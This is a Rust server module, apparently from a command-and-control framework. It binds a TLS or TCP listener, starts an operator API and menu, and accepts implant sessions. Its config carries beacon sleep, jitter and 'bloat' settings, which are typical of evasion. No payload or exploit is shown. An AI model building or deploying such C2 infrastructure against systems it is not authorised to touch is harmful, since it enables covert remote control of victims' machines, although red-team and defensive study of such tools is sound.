// ./src/server/mod.rs 
pub mod session;

use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use std::env;
use uuid::Uuid;

use crate::{database, menu, api};
use crate::common::{SharedSessions, C2Config, TransportProtocol};
use crate::transport::ServerTransport; 

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    let db_conn = database::init()?;
    
    let transport_mode = match env::var("C2_TRANSPORT").unwrap_or_else(|_| "tls".into()).as_str() {
        "tcp_plain" => TransportProtocol::TcpPlain,
        _ => TransportProtocol::Tls,
    };

    // [MODIFIED] Update config to match new struct fields
    let config = C2Config {
        transport: transport_mode.clone(), 
        tunnel_port: 4443,
        server_public_key: "".into(), hash_salt: "".into(), c2_host: "".into(), 
        build_id: "SERVER".into(), 
        sleep_interval: 5, 
        jitter_min: 0, 
        jitter_max: 0, 
        bloat_mb: 0, 
        debug: true
    };

    let (cert, key, ca) = database::load_or_import_certs(&db_conn)?;
    let transport = Arc::new(ServerTransport::bind(&config, &cert, &key, &ca).await?);
    let db_arc = Arc::new(Mutex::new(db_conn));

    let sessions: SharedSessions = Arc::new(Mutex::new(HashMap::new()));
    let results_store: api::SharedResults = Arc::new(Mutex::new(HashMap::new()));
    let proxy_store: api::SharedProxies = Arc::new(Mutex::new(HashMap::new()));

    let api_key = Uuid::new_v4().to_string();
    let api_port = 8080;

    println!("========================================");
    println!("[*] Transport:      {:?}", config.transport);
    println!("[*] Tunnel Port:    {}", config.tunnel_port);
    println!("[*] API Key:        {}", api_key);
    println!("[*] API Endpoint:   http://127.0.0.1:{}", api_port);
    println!("========================================");

    let s_api = sessions.clone();
    let db_api = db_arc.clone();
    let res_api = results_store.clone();
    let prox_api = proxy_store.clone();
    let key_clone = api_key.clone();

    tokio::spawn(async move {
        api::start_api_server(s_api, db_api, res_api, prox_api, key_clone, api_port).await;
    });

    let s_cli = sessions.clone();
    std::thread::spawn(move || {
        if let Err(e) = menu::run(s_cli) { eprintln!("Menu Error: {:?}", e); }
    });

    println!("[+] C2 Server listening...");

    loop {
        match transport.accept().await {
            Ok((stream, peer_addr)) => {
                let sessions = sessions.clone();
                let db = db_arc.clone();
                let results = results_store.clone();

                tokio::spawn(async move {
                    session::handle_connection(stream, peer_addr, sessions, db, results, None).await;
                });
            }
            Err(e) => {
                eprintln!("[-] Connection Error: {}", e);
            }
        }
    }
}
